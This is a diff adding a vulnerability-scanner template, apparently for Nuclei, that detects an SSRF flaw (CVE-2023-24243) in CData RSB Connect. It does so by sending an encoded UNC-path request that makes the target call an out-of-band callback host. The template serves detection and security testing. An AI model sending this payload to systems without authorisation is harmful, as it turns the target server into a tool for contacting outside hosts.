@@ -1,0 +1,28 @@
+id: cdata-rsb-connect-ssrf
+info:
+  name: CData RSB Connect SSRF Vulnerability (CVE-2023-24243)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: dnslog,ssrf,cve-2023-24243
+
+variables:
+  reverse: '{{interactsh-url}}'
+
+http:
+  - raw:
+      - |
+        GET /%255c%255c{{reverse}}%255cC$%255cbb HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 404
+      - type: word
+        part: body
+        words:
+          - ""
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns
